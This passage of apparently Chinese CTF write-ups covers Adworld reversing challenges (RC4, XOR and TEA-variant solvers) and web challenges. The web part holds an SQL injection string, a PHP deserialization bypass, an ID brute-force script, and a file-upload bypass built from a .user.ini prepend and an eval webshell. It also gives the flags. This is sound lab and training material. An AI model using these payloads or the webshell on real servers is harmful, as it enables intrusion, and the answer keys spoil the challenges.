0, 0,        1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0,        1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 1, 0,        1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0,        1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0,        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,    },    {        1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,        1, 1, 0, 3, 1, 1, 1, 1, 1, 0, 0, 0, 0, 0, 0,        1, 1, 0, 1, 1, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0,        1, 1, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0,        1, 1, 0, 1, 1, 0, 0, 0, 1, 1, 1, 1, 1, 0, 0,        1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0,        1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0,        1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0,        1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 1, 0,        1, 1, 0, 1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0,        1, 1, 0, 1, 1, 1, 1, 1, 1, 0, 1, 0, 1, 1, 0,        1, 1, 0, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 0,        1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0,        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,        1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1, 1,    },    {        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,        0, 3, 1, 1, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,        0, 0, 0, 1, 0, 1, 1, 1, 0, 0, 0, 0, 0, 0, 0,        0, 0, 0, 1, 1, 1, 0, 1, 0, 0, 0, 0, 0, 0, 0,        0, 0, 0, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0,        0, 1, 1, 0, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0,        0, 0, 1, 1, 1, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0,        0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0, 0, 0, 0,        0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0, 0, 0, 0,        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0,        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0,        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0,        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 0,        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 1, 0,        0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 4, 0,    },};char pre[3][15][15];void get_start_pos(int maze, int* x, int* y){ // 找起点    for(int i = 0; i &lt; 15; ++i){        for(int j = 0; j &lt; 15; ++j){            if(dword_202020[maze][i][j] == 3){                *x = i, *y = j; return;            }        }    }}void print(int maze, int x, int y){ // 递归打印路径    if(pre[maze][x][y] == 'q') return;    if(pre[maze][x][y] == 'w') print(maze, x+1, y);    if(pre[maze][x][y] == 'a') print(maze, x, y+1);    if(pre[maze][x][y] =='s') print(maze, x-1, y);    if(pre[maze][x][y] == 'd') print(maze, x, y-1);    putchar(pre[maze][x][y]);}void bfs(int maze, int x, int y){    std::queue&lt;std::pair&lt;int, int&gt;&gt; q;    pre[maze][x][y] = 'q';    q.push({x, y});    while(q.size()){        int x = q.front().first, y = q.front().second; q.pop();        if(dword_202020[maze][x][y] == 4){print(maze, x, y); return;}        dword_202020[maze][x][y] = 0;        if(x &gt; 0 and dword_202020[maze][x-1][y]){            q.push({x-1, y});            pre[maze][x-1][y] = 'w';        }        if(x &lt; 14 and dword_202020[maze][x+1][y]){            q.push({x+1, y});            pre[maze][x+1][y] = 's';        }        if(y &gt; 0 and dword_202020[maze][x][y-1]){            q.push({x, y-1});            pre[maze][x][y-1] = 'a';        }        if(y &lt; 14 and dword_202020[maze][x][y+1]){            q.push({x, y+1});            pre[maze][x][y+1] = 'd';        }    }}int main(){    int maze = 0, x = -1, y = -1;    while(maze &lt;= 2){        get_start_pos(maze, &amp;x, &amp;y);        bfs(maze, x, y);        ++maze;    }    return 0^(0-0)^0;}// Output: ddsssddddsssdssdddddsssddddsssaassssdddsddssddwddssssssdddssssdddss\n\nflag格式在sub_940的最后面: flag{md5(your input)}.\nFlag: flag{aeea66fcac7fa80ed8f79f38ad5bb953}\n\n1000Click解压附件得到1000Click.exe.\nDIE:\n\n似乎加壳了. 用IDA打开, 发现有  个函数…\n\n果断放弃.\n先用DIE直接查字符串:\n\n一堆假flag. 还是老老实实运行程序吧.\n\n看样子, 只需要点击Click按钮  次即可拿到flag.\nDBC或DC很快就点到  次了.\n当然, 也可以写一个AutoClicker.\n#include &lt;windows.h&gt;int main(){    int cnt = 0;    while(cnt &lt; 1000)    {        if(GetAsyncKeyState('S')) // 鼠标对准按钮, 按下S键开启连点.        {            while(cnt &lt; 1000)            {                mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);                mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);                Sleep(3);                if(GetAsyncKeyState('B')) break; // 发生意外请按B键退出.                ++cnt;            }            exit(0);        }    }    return 0^(0-0)^0;}\n\n上述代码可能需要以管理员身份运行.\n点击  次后会有一个弹窗:\n\n弹窗里的flag无法直接复制, 别傻呵呵地去辨认l和I, 直接在DIE里搜.\n\nFlag: flag{TIBntXVbdZ4Z9VRtoOQ2wRlvDNIjQ8Ra}\n\ncrypt解压附件得到 crypt.exe.\n没有壳, 直接扔进 IDA 反编译.\nmainsub_140001120sub_140001140int __fastcall main(int argc, const char **argv, const char **envp){  unsigned int v3; // eax  unsigned int v4; // eax  __int64 v5; // rax  __int64 v7; // rax  int i; // [rsp+24h] [rbp-D4h]  void *v9; // [rsp+28h] [rbp-D0h]  char v10[32]; // [rsp+30h] [rbp-C8h] BYREF  char Str[32]; // [rsp+50h] [rbp-A8h] BYREF  char v12[96]; // [rsp+70h] [rbp-88h] BYREF  strcpy(Str, \"12345678abcdefghijklmnopqrspxyz\");  memset(v12, 0, sizeof(v12));  memset(v10, 0, 0x17ui64);  sub_1400054D0(\"%s\", v10); // scanf  v9 = malloc(0x408ui64);  v3 = strlen(Str);  sub_140001120(v9, Str, v3); // 待分析  v4 = strlen(v10);  sub_140001240(v9, v10, v4); // 待分析  for ( i = 0; i &lt; 22; ++i )  {    if ( ((unsigned __int8)v10[i] ^ 0x22) != (unsigned __int8)byte_14013B000[i] )    {      v5 = sub_1400015A0(&amp;off_14013B020, \"error\");      _CallMemberFunction0(v5, sub_140001F10);      return 0;    }  }  v7 = sub_1400015A0(&amp;off_14013B020, \"nice job\");  _CallMemberFunction0(v7, sub_140001F10);  return 0;}// 补充:_BYTE byte_14013B000[24] ={  0x9E, 0xE7, 0x30, 0x5F, 0xA7, 0x01, 0xA6, 0x53, 0x59, 0x1B,   0x0A, 0x20, 0xF1, 0x73, 0xD1, 0x0E, 0xAB, 0x09, 0x84, 0x0E,   0x8D, 0x2B, 0x00, 0x00};__int64 __fastcall sub_140001120(_DWORD *a1, __int64 a2, int a3){  __int64 result; // rax  int i; // [rsp+0h] [rbp-28h]  int j; // [rsp+0h] [rbp-28h]  int v6; // [rsp+4h] [rbp-24h]  int v7; // [rsp+8h] [rbp-20h]  int v8; // [rsp+Ch] [rbp-1Ch]  _DWORD *v9; // [rsp+10h] [rbp-18h]  *a1 = 0;  a1[1] = 0;  v9 = a1 + 2;  for ( i = 0; i &lt; 256; ++i )    v9[i] = i;  v6 = 0;  result = 0i64;  LOBYTE(v7) = 0;  for ( j = 0; j &lt; 256; ++j )  {    v8 = v9[j];    v7 = (unsigned __int8)(*(_BYTE *)(a2 + v6) + v8 + v7);    v9[j] = v9[v7];    v9[v7] = v8;    if ( ++v6 &gt;= a3 )      v6 = 0;    result = (unsigned int)(j + 1);  }  return result;}_DWORD *__fastcall sub_140001240(_DWORD *a1, __int64 a2, int a3){  _DWORD *result; // rax  int i; // [rsp+0h] [rbp-28h]  int v5; // [rsp+4h] [rbp-24h]  int v6; // [rsp+8h] [rbp-20h]  int v7; // [rsp+Ch] [rbp-1Ch]  int v8; // [rsp+10h] [rbp-18h]  _DWORD *v9; // [rsp+18h] [rbp-10h]  v5 = *a1;  v6 = a1[1];  v9 = a1 + 2;  for ( i = 0; i &lt; a3; ++i )  {    v5 = (unsigned __int8)(v5 + 1);    v7 = v9[v5];    v6 = (unsigned __int8)(v7 + v6);    v8 = v9[v6];    v9[v5] = v8;    v9[v6] = v7;    *(_BYTE *)(a2 + i) ^= LOBYTE(v9[(unsigned __int8)(v8 + v7)]);  }  *a1 = v5;  result = a1;  a1[1] = v6;  return result;}\n\n分析了一下, 这是一个 RC4 加密.\nWiki: RC4\nexp:\n#include &lt;cstdio&gt;#include &lt;cstring&gt;unsigned char key[] = \"12345678abcdefghijklmnopqrspxyz\"; // 密钥unsigned char text[] = {    0x9E, 0xE7, 0x30, 0x5F, 0xA7, 0x01, 0xA6, 0x53, 0x59, 0x1B,    0x0A, 0x20, 0xF1, 0x73, 0xD1, 0x0E, 0xAB, 0x09, 0x84, 0x0E,    0x8D, 0x2B}; // 22 字节密文template &lt;typename T&gt; void swap(T *a, T *b){T temp = *a; *a = *b; *b = temp;}void rc4_init(unsigned char *S, unsigned char *key, int key_len){    // 初始化 S-box    for(int i = 0; i &lt; 256; ++i) S[i] = i;    for(int i = 0, j = 0; i &lt; 256; ++i){        j = (j + S[i] + key[i % key_len]) % 256;        swap(&amp;S[i], &amp;S[j]);    }}void rc4_crypt(unsigned char *S, unsigned char *text, int text_len){    // 加密    for(int i = 0, j = 0, k = 0; k &lt; text_len; ++k){        i = (i + 1) % 256;        j = (j + S[i]) % 256;        swap(&amp;S[i], &amp;S[j]);        text[k] ^= S[(S[i] + S[j]) % 256];    }}void rc4_decrypt(unsigned char *S, unsigned char *text, int text_len){    rc4_crypt(S, text, text_len); // RC4 是对称加密算法.}int main(){    // 异或    for(int i = 0; i &lt; sizeof(text); ++i) text[i] ^= 0x22;    // RC4 解密    unsigned char S[256];    rc4_init(S, key, strlen((char *)key));    rc4_decrypt(S, text, sizeof(text));    printf(\"%s\\n\", text);    return 0^(0-0)^0;}\n\nFlag: flag{nice_to_meet_you}\n\nhappyctf附件是 happyctf.exe 与 happyctf.pdb.\n把 happyctf.exe 扔进 IDA (32位), 发现主函数非常恶心:\nint __cdecl main(int argc, const char **argv, const char **envp){  std::ostream *v3; // eax  std::ostream *v4; // eax  std::ostream *v6; // eax  std::ostream *v7; // eax  unsigned __int8 *v8; // [esp+5Ch] [ebp-70h]  unsigned __int8 *v9; // [esp+60h] [ebp-6Ch]  main::__l2::&lt;lambda_7686c8adb828765130ce2b0d457195d9&gt; cmp; // [esp+68h] [ebp-64h] BYREF  unsigned __int8 key[24]; // [esp+6Ch] [ebp-60h] BYREF  char item; // [esp+87h] [ebp-45h]  char *v13; // [esp+88h] [ebp-44h]  char *v14; // [esp+8Ch] [ebp-40h]  std::string *p_str; // [esp+90h] [ebp-3Ch]  main::__l2::&lt;lambda_1b3a4e77a09e1a7ed440bad3aa4c443b&gt; add; // [esp+94h] [ebp-38h] BYREF  std::vector&lt;unsigned char&gt; v; // [esp+98h] [ebp-34h] BYREF  std::string str; // [esp+A4h] [ebp-28h] BYREF  int v19; // [esp+C8h] [ebp-4h]  std::string::string(&amp;str);  v19 = 0;  v3 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"please input flag\");  std::ostream::operator&lt;&lt;(v3, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);  std::operator&gt;&gt;&lt;char&gt;(&amp;std::cin, &amp;str);  if ( std::string::length(&amp;str) == 24 )  {    std::vector&lt;unsigned char&gt;::vector&lt;unsigned char&gt;(&amp;v);    LOBYTE(v19) = 1;    lambda_1b3a4e77a09e1a7ed440bad3aa4c443b_::_lambda_1b3a4e77a09e1a7ed440bad3aa4c443b_(&amp;add, &amp;v);    p_str = &amp;str;    v14 = std::string::_Unchecked_begin(&amp;str);    v13 = std::string::_Unchecked_end(&amp;str);    while ( v14 != v13 )    {      item = *v14;      lambda_1b3a4e77a09e1a7ed440bad3aa4c443b_::operator()(&amp;add, item);      ++v14;    }    qmemcpy(key, \"rxusoCqxw{yqK`{KZqag{r`i\", sizeof(key));    lambda_7686c8adb828765130ce2b0d457195d9_::_lambda_7686c8adb828765130ce2b0d457195d9_(      &amp;cmp,      (unsigned __int8 (*)[24])key);    v9 = std::vector&lt;unsigned char&gt;::_Unchecked_begin(&amp;v);    v8 = std::vector&lt;unsigned char&gt;::_Unchecked_end(&amp;v);    while ( v9 != v8 )    {      if ( !lambda_7686c8adb828765130ce2b0d457195d9_::operator()(&amp;cmp, *v9) )      {        v6 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"error\");        std::ostream::operator&lt;&lt;(v6, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);        LOBYTE(v19) = 0;        std::vector&lt;unsigned char&gt;::~vector&lt;unsigned char&gt;(&amp;v);        v19 = -1;        std::string::~string(&amp;str);        return 0;      }      ++v9;    }    v7 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"good job\");    std::ostream::operator&lt;&lt;(v7, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    LOBYTE(v19) = 0;    std::vector&lt;unsigned char&gt;::~vector&lt;unsigned char&gt;(&amp;v);    v19 = -1;    std::string::~string(&amp;str);    return 0;  }  else  {    v4 = std::operator&lt;&lt;&lt;std::char_traits&lt;char&gt;&gt;(&amp;std::cout, \"not enought\");    std::ostream::operator&lt;&lt;(v4, std::endl&lt;char,std::char_traits&lt;char&gt;&gt;);    v19 = -1;    std::string::~string(&amp;str);    return 0;  }}\n\n重点是这个 lambda_1b3a4e77a09e1a7ed440bad3aa4c443b_::operator()(&amp;add, item);, 跟进 add函数:\nvoid __thiscall lambda_1b3a4e77a09e1a7ed440bad3aa4c443b_::operator()(        main::__l2::&lt;lambda_1b3a4e77a09e1a7ed440bad3aa4c443b&gt; *this,        unsigned __int8 bytee){  unsigned __int8 _Val[65]; // [esp+Fh] [ebp-45h] BYREF  const main::__l2::&lt;lambda_1b3a4e77a09e1a7ed440bad3aa4c443b&gt; *thisa; // [esp+50h] [ebp-4h]  thisa = this;  _Val[0] = bytee ^ 0x14;  std::vector&lt;unsigned char&gt;::push_back(this-&gt;v, _Val);  ++`_lambda_1b3a4e77a09e1a7ed440bad3aa4c443b_::operator()'::`2'::index;}\n\n发现似乎只是异或了一下 0x14.\n于是, 将 key 与 0x14 异或, 即可得到 flag.\n#include &lt;cstdio&gt;char str[100] = \"rxusoCqxw{yqK`{KZqag{r`i\";int main(){    for(int i = 0; str[i]; ++i) str[i] ^= 0x14;    printf(\"%s\\n\", str); // flag{Welcome_to_Neusoft}}\n\nFlag: flag{Welcome_to_Neusoft}\n\nxxxorrr附件 xor, 扔进 IDA.\nmainsub_84Asub_916__int64 __fastcall main(int a1, char **a2, char **a3){  int i; // [rsp+Ch] [rbp-34h]  char s[40]; // [rsp+10h] [rbp-30h] BYREF  unsigned __int64 v6; // [rsp+38h] [rbp-8h]  v6 = __readfsqword(0x28u);  sub_A90(sub_916, a2, a3);  fgets(s, 35, stdin);  for ( i = 0; i &lt;= 33; ++i )    s1[i] ^= s[i];  return 0LL;}unsigned __int64 sub_84A(){  int i; // [rsp+Ch] [rbp-14h]  unsigned __int64 v2; // [rsp+18h] [rbp-8h]  v2 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 33; ++i )    s1[i] ^= 2 * i + 65;  return __readfsqword(0x28u) ^ v2;}unsigned __int64 sub_916(){  unsigned __int64 v1; // [rsp+8h] [rbp-8h]  v1 = __readfsqword(0x28u);  if ( !strcmp(s1, s2) )    puts(\"Congratulations!\");  else    puts(\"Wrong!\");  return __readfsqword(0x28u) ^ v1;}\n\nmain 函数并没有显示调用 sub_84A 与 sub_916 函数, 但可以合理推测 sub_84A 在 main函数之前调用, sub_916 在 main 函数之后调用.\n于是, 整个执行流程为: sub_84A 操作 s1[i] -&gt; main 中 s1[i] 与 s[i] 异或 -&gt; sub_916 要求 s1[i] 与 s2[i] 相同.\nexp:\n#include &lt;cstdio&gt;unsigned char s1[] = \"qasxcytgsasxcvrefghnrfghnjedfgbhn\";unsigned char s2[] ={  0x56, 0x4E, 0x57, 0x58, 0x51, 0x51, 0x09, 0x46, 0x17, 0x46,   0x54, 0x5A, 0x59, 0x59, 0x1F, 0x48, 0x32, 0x5B, 0x6B, 0x7C,   0x75, 0x6E, 0x7E, 0x6E, 0x2F, 0x77, 0x4F, 0x7A, 0x71, 0x43,   0x2B, 0x26, 0x89, 0xFE};int main(){    for(int i = 0; i &lt; 34; ++i) s1[i] ^= 2 * i + 65;    for(int i = 0; i &lt; 34; ++i) s1[i] ^= s2[i];    printf(\"%s\\n\", s1); // flag{c0n5truct0r5_functi0n_in_41f}}\n\nFlag: flag{c0n5truct0r5_functi0n_in_41f}\n\nbad_python做过类似题, 看一眼题目描述就知道是要修复 pyc 文件头.\n010 Editor 打开一看, 果然如此.\n附一份正常的 pyc 文件:\n33 0D 0D 0A 25 F7 21 68 14 00 00 00 E3 00 00 0000 00 00 00 00 00 00 00 00 02 00 00 00 40 00 0000 73 0C 00 00 00 65 00 64 00 83 01 01 00 64 0153 00 29 02 7A 0B 48 65 6C 6C 6F 20 57 6F 72 6C64 4E 29 01 DA 05 70 72 69 6E 74 A9 00 72 02 0000 00 72 02 00 00 00 FA 07 74 65 73 74 2E 70 79DA 08 3C 6D 6F 64 75 6C 65 3E 01 00 00 00 73 0000 00 00\n\n把头部替换掉即可. 然后 uncompyle6 -o . pyre.cpython-36.pyc 反编译得到 py 文件.\n# uncompyle6 version 3.9.2# Python bytecode version base 3.6 (3379)# Decompiled from: Python 3.12.3 (tags/v3.12.3:f6650f9, Apr  9 2024, 14:05:25) [MSC v.1938 64 bit (AMD64)]# Embedded file name: pyre.py# Compiled at: 2025-05-12 21:27:01# Size of source mod 2**32: 20 bytesfrom ctypes import *from Crypto.Util.number import bytes_to_longfrom Crypto.Util.number import long_to_bytesdef encrypt(v, k):    v0 = c_uint32(v[0])    v1 = c_uint32(v[1])    sum1 = c_uint32(0)    delta = 195935983    for i in range(32):        v0.value += (v1.value &lt;&lt; 4 ^ v1.value &gt;&gt; 7) + v1.value ^ sum1.value + k[sum1.value &amp; 3]        sum1.value += delta        v1.value += (v0.value &lt;&lt; 4 ^ v0.value &gt;&gt; 7) + v0.value ^ sum1.value + k[sum1.value &gt;&gt; 9 &amp; 3]    return (     v0.value, v1.value)if __name__ == \"__main__\":    flag = input(\"please input your flag:\")    k = [255, 187, 51, 68]    if len(flag) != 32:        print(\"wrong!\")        exit(-1)    a = []    for i in range(0, 32, 8):        v1 = bytes_to_long(bytes(flag[i:i + 4], \"ascii\"))        v2 = bytes_to_long(bytes(flag[i + 4:i + 8], \"ascii\"))        a += encrypt([v1, v2], k)    enc = [     4006073346, 2582197823, 2235293281, 558171287, 2425328816,      1715140098, 986348143, 1948615354]    for i in range(8):        if enc[i] != a[i]:            print(\"wrong!\")            exit(-1)    print(\"flag is flag{%s}\" % flag)\n\n是一个变种 TEA, 直接解就行.\nexp:\nfrom ctypes import *from Crypto.Util.number import bytes_to_longfrom Crypto.Util.number import long_to_bytesdef decrypt(v, k):    v0 = c_uint32(v[0])    v1 = c_uint32(v[1])    sum1 = c_uint32(195935983 * 32)    delta = 195935983    for i in range(32):        v1.value -= (v0.value &lt;&lt; 4 ^ v0.value &gt;&gt; 7) + v0.value ^ sum1.value + k[sum1.value &gt;&gt; 9 &amp; 3]        sum1.value -= delta        v0.value -= (v1.value &lt;&lt; 4 ^ v1.value &gt;&gt; 7) + v1.value ^ sum1.value + k[sum1.value &amp; 3]    return (v0.value, v1.value)enc = [     4006073346, 2582197823, 2235293281, 558171287, 2425328816,      1715140098, 986348143, 1948615354]k = [255, 187, 51, 68]flag = b\"\"for i in range(0, len(enc), 2):    part1, part2 = decrypt([enc[i], enc[i+1]], k)    flag += long_to_bytes(part1)    flag += long_to_bytes(part2)print(\"flag{%s}\" % flag.decode(\"ascii\"))# flag{Th1s_1s_A_Easy_Pyth0n__R3veRse_0}\n\nFlag: flag{Th1s_1s_A_Easy_Pyth0n__R3veRse_0}\n\nereere附件 ere, 扔进 DIE 一看, wtf, MIPS 指令集?\n于是决定先咕咕咕.\n","categories":["CTF"],"tags":["Adworld","Re"]},{"title":"Adworld Web Writeups 1","url":"/2025/03/15/Adworld-Web-Writeups-1/","content":"注意, 这里的大部分题都是 动态flag.\nTraining-WWW-Robots先访问 /robots.txt:\nUser-agent: *Disallow: /fl0g.phpUser-agent: YandexDisallow: *\n\n再访问 /fl0g.php.\nFlag: cyberpeace{a727b7e6310991a4dc9d8020eaa232c5}\n\nPHP2拿dirsearch扫了半天, 扫不出一个200.\n只好开摆, 查了一下这道题, 才知道有.phps文件… 而我的所有字典都没有.phps, 难怪扫不出来.\n拿到源码就好办了:\n&lt;?phpif(\"admin\"===$_GET[id]) {  echo(\"&lt;p&gt;not allowed!&lt;/p&gt;\");  exit();}$_GET[id] = urldecode($_GET[id]);if($_GET[id] == \"admin\"){  echo \"&lt;p&gt;Access granted!&lt;/p&gt;\";  echo \"&lt;p&gt;Key: xxxxxxx &lt;/p&gt;\";}?&gt;Can you anthenticate to this website?\n\n要求: urldecode后是admin, 直接URL编码绕过.\na的ASCII是 97 , 十六进制是 61 .%的ASCII是 37, 十六进制是 25 .\n构造 id 为 %2561dmin即可.\nFlag: cyberpeace{068c53f5e2709a1f18ee797ed388492d}\n\nunserialize3class xctf{public $flag = '111';public function __wakeup(){exit('bad requests');}?code=\n\n代码漏了一个}.\n是一道简单的 PHP 反序列化绕过的题.\n显然, 我们要尝试绕过 __wakeup 函数.\n当成员属性数目大于实际数目时, 即可绕过 __wakeup.\n&lt;?phpclass xctf{    public $flag = '111';    public function __wakeup(){        exit('bad requests');    }}$obj = new xctf();$str = serialize($obj);echo $str; # O:4:\"xctf\":1:{s:4:\"flag\";s:3:\"111\";}?&gt;\n\n构造的 code 为:\nO:4:\"xctf\":2:{s:4:\"flag\";s:3:\"111\";}\n\nFlag: cyberpeace{610f9c0c99ab7b07276966de257e2da1}\nPHP反序列化漏洞可参见这篇文章进行学习.\nics-06点击 报表中心 跳转 /index.php?id=1.\n审计了一下页面的源码, 没发现什么异常.\n看看题目描述: 云平台报表中心收集了设备管理基础服务的数据，但是数据被删除了，只有一处留下了入侵者的痕迹。\n改了一下 id , 没任何反应.\n盲猜要爆破 id.\n爆破脚本:\nimport requestsimport osfrom concurrent.futures import ThreadPoolExecutor, as_completedurl = \"http://61.147.171.105:54036/index.php?id=\"def fetch(id: int):    resp = requests.get(url + str(id))    resp.encoding = resp.apparent_encoding    if \"送分题\" not in resp.text:        with open(\"id.txt\", \"w\") as f:            f.write(str(id))        print(f\"Found id: {id}\")        os._exit(0)def main():    with ThreadPoolExecutor(max_workers = 64) as hacker:        for id in range(65536):            hacker.submit(fetch, id)if __name__ == \"__main__\":    main()\n\n几秒就爆破出 id=2333, 访问即可得到 flag.\nFlag: cyberpeace{8c3fdb44278bc65198b6da8c732b7ed6}\n\nview_sourceF12 即可.\nFlag: cyberpeace{f200b00df770f8fd9df2da5d7f3e505e}\n\nget_post没啥好说的.\nexp:\nimport requestsurl = \"http://61.147.171.105:57451\"resp = requests.post(url, params = {\"a\" : 1}, data = {\"b\" : 2})resp.encoding = resp.apparent_encodingprint(resp.text)\n\nFlag: cyberpeace{ba973dd8b02a14c684fe76531c9ccfbc}\n\nrobots和 Training-WWW-Robots 一样.\n先访问 /robots.txt, 再访问 /f1ag_1s_h3re.php.\nFlag: cyberpeace{2d17e2577a19509abf26908004bb5f60}\n\nbackupQ: “”你知道index.php的备份文件名吗？”A: “index.php.bak”\nFlag: Cyberpeace{855A1C4B3401294CB6604CCC98BDE334}\n\ncookieF12, 发现请求头里 look-here=cookie.php\n访问 /cookie.php , flag 在响应头里.\nFlag: cyberpeace{93fba8d1795a8bf596106002e7621db8}\n\n这个系列好简单啊, 不想做了.\ndisabled_buttonF12:\n&lt;input disabled class=\"btn btn-default\" style=\"height:50px;width:200px;\" type=\"submit\" value=\"flag\" name=\"auth\" /&gt;\n\n把 disabled 删了, 再点击按钮.\n或者用脚本模拟请求:\nimport requestsurl = \"http://61.147.171.105:56774/\"resp = requests.post(url, data = {\"auth\": \"flag\"})print(resp.text)\n\nFlag: cyberpeace{1dde99168aaacfeb8003d771cc6d5f2e}\n\nweak_auth用户名: admin密码: 123456\nFlag: cyberpeace{5b096bbe212168f19a8578d023a80f90}\n\nsimple_php&lt;?phpshow_source(__FILE__);include \"config.php\";$a = @$_GET['a'];$b = @$_GET['b'];if ($a == 0 and $a) {    echo $flag1;}if (is_numeric($b)) {    exit();}if ($b &gt; 1234) {    echo $flag2;}?&gt;\n\n考察 PHP 的特性.\n\n==: 类型转换后再判断是否相等. (值相等, 类型可不相等)\n===: 类型也要相同才相等. (值和类型都相等)\n\n$a == 0 and $a: 很容易实现, 让 $a 是一个非数字字符串即可.\nnot is_numeric($b) and $b &gt; 1234: 字符串 114514HHH 弱类型转换后是 114514, 像这样绕过即可.\nexp:\nimport requestsurl = \"http://61.147.171.105:50858\"resp = requests.get(    url,    params = {        \"a\": \"qwq\",        \"b\": \"1919810HH\"    })resp.encoding = resp.apparent_encodingprint(resp.text)\n\nFlag: Cyberpeace{647E37C7627CC3E4019EC69324F66C7C}\n\nbaby_web一打开 link, 就被重定向到 /1.php.\n初始界面? 不就是 /index.php吗?\n改 url 为 /index.php, 仍然被重定向到 /1.php.\n打开控制台, 发现 /index.php 的相应头里有一句 FLAG: flag{very_baby_web}.\nFlag: flag{very_baby_web}\n\ninget页面就一句话: Please enter ID,and Try to bypass\nF12 发现请求头里有一句 look-here=cookie.php. (其实每道题都是这样)\n访问 /cookie.php, 404…\n拿 dirsearch 没扫出任何东西.\n于是开始揣摩出题人意图.\n题目名为 inget, 结合 enter ID, 猜测就是要用 GET 请求发送一个 id 参数.\n而 id 的内容, 就是要用于 bypass. 要绕过啥?\n我的第一反应就是SQL 注入…\n构造 id 为: ' OR '1' = '1:\n成功 get flag.\nFlag: cyberpeace{2f96c137abbaa0a44e4674d072e8ca34}\neasyupload发现上传的文件可以直接被访问.\n看了一下源码, 没看到文件校验的代码, 说明是后端校验.\n尝试构造一个 PHP 文件, 执行传入的命令并打印.\n但是提交的时候, 页面显示 Your file looks wicked. 看来*.php 被 ban 了.\n随便传了个 *.txt 上去, 显示 your filetype looks wicked.\n文件最开始加一行 GIF89a, 再次提交, 成功.\n而文件内容只要包含 php, 就不行.\n总结一下题目要求:\n\n格式校验, 用文件头 GIF89a 绕过就行.\n后缀不能是 .php\n文件内容不能出现 php. 这个用  绕过即可.\n\n重点在于第二个要求. 如何让 PHP 解析非 .php 文件 ?\n知识点: .htaccess 和 .user.ini\n.htaccess 是 Apache 服务器的配置文件, 用于配置网站的一些参数, 其中包括文件的解析方式.\n\n通过上传如下的 .htaccess 文件:\n&lt;FilesMatch \"\\.jpg\"&gt;  SetHandler application/x-httpd-php&lt;/FilesMatch&gt;\n\n就可以让 *.jpg 文件被视为 PHP 代码来执行.\n不过, 这是 Apache 服务器的配置文件, 此题的环境是 Nginx, 行不通.\n\n.user.ini 是 PHP 的配置文件, 功能和 .htaccess 有点像, 其中有用的两条是 auto_prepend_file 和 auto_append_file, 其意义是将指定的文件内容插入到每个 PHP 文件, 其中 prepend 是在文件开头插入, append 是在文件结尾插入.\n\n利用 .user.ini 的前提:\n\n\n题目开启了 CGI 或者 FastCGI.\n\n\n\n同目录下有可以访问的 .php 文件.\n\n\n\n此题可以通过上传如下 .user.ini 文件:\nGIF89aauto_prepend_file = hack.gif\n\n然后再上传如下 hack.gif 文件:\nGIF89a &lt;?=eval($_POST['cmd']);?&gt;\n\n攻击过程直接传 .user.ini, 显示 your filetype looks wicked.\n只能启动 Burp Suite 了.\n把 Intercept 打开, 上传 .user.ini 的时候, 把 Content-Type 由 application/octet-stream 改为 image/gif 即可成功上传.\n然后再上传 hack.gif.\n最后, 用 菜刀 连接即可, 打开虚拟终端, 一顿操作和观察, 发现 flag 在根目录下.\ncat /flag 即可 get flag.\nFlag: cyberpeace{1812ad12734cd4c9a47f1e6482a31c82}\n\nfileincludeF12 查看源码, 发现有一段 php:\n&lt;?phpif( !ini_get('display_errors') ) {  ini_set('display_errors', 'On');  }error_reporting(E_ALL);$lan = $_COOKIE['language'];if(!$lan){\t@setcookie(\"language\",\"english\");\t@include(\"english.php\");}else{\t@include($lan.\".php\");}$x=file_get_contents('index.php');echo $x;?&gt;\n\n发现 @include , 